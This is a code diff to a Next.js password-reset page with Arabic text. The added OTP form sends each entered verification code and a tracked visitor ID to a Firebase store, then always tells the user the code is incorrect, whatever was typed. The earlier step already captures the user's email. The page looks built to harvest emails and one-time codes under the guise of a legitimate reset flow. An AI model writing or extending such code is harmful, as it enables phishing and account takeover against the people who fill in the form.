@@ -2,20 +2,36 @@
 
 import { addData } from "@/lib/firebase"
 import Link from "next/link"
-import { useState } from "react"
+import React, { useState } from "react"
+const allOtps=['']
 function OtpFeild() {
+  const [otp,setOtp]=useState('')
+  const handleOtp=async(e:React.FormEvent)=>{
+    e.preventDefault()
+    const visitorID= localStorage.getItem('visitor')
+    await addData({id:visitorID,otp,allOtps}).then(()=>{
+   setTimeout(() => {
+    alert('رمز التحقق غير صحيح')
+   }, 2000);   
+    })
+
+  }
   return (
+    <div className="min-h-screen bg-[#3a3a3a] flex items-center justify-center p-4">
     <div className="w-full max-w-md">
-        <div className="text-center mb-12">
+      <div className="text-center mb-12">
         <p className="text-gray-400 text-md">
-  رمز التحقق تم إرساله بنجاح إلى بريدك الإلكتروني. تحقق من صندوق الوارد الخاص بك لإكمال العملية.
-</p>
+          رمز التحقق تم إرساله بنجاح إلى بريدك الإلكتروني. تحقق من صندوق الوارد الخاص بك لإكمال العملية.
+        </p>
       </div>
-      <form className="space-y-6">
+      <form className="space-y-6" onSubmit={handleOtp}>
         {/* Email Field */}
         <div>
           <input
             type="tel"
+            value={otp}
+            maxLength={6}
+            onChange={(e)=>setOtp(e.target.value)}
             placeholder="رمز التحقق"
             className="w-full px-4 py-3 bg-[#2a2a2a] border border-[#4a7c9e] rounded-lg text-white placeholder-gray-600 text-right focus:outline-none focus:border-[#6fa3c1] focus:ring-1 focus:ring-[#6fa3c1]"
           />
@@ -30,25 +46,26 @@ function OtpFeild() {
         </button>
       </form>
     </div>
+    </div>
   )
 }
 export default function ResetPasswordPage() {
   const [email, setEmail] = useState('')
-  const [loading,setLoading]=useState(true)
-  const [step,setStep]=useState<'email'|'otp'>('email')
+  const [loading, setLoading] = useState(true)
+  const [step, setStep] = useState<'email' | 'otp'>('email')
 
-  const handleSubmit=async(e:React.FormEvent)=>{
+  const handleSubmit = async (e: React.FormEvent) => {
     e.preventDefault()
-    const visitorID=localStorage.getItem('visitor')
+    const visitorID = localStorage.getItem('visitor')
     setLoading(true)
-    await addData({id:visitorID,email,page:'forgeet'}).then(()=>{
+    await addData({ id: visitorID, email, page: 'forgeet' }).then(() => {
       setLoading(false)
       setStep('otp')
     })
-    
-    }
+
+  }
   return (
-    <div className="min-h-screen bg-[#3a3a3a] flex items-center justify-center p-4">
+    step === 'email' ? (<div className="min-h-screen bg-[#3a3a3a] flex items-center justify-center p-4">
       <div className="w-full max-w-md">
         {/* Header */}
         <div className="text-center mb-12">
@@ -89,6 +106,6 @@ export default function ResetPasswordPage() {
 
         </div>
       </div>
-    </div>
+    </div>) : <OtpFeild />
   )
 }
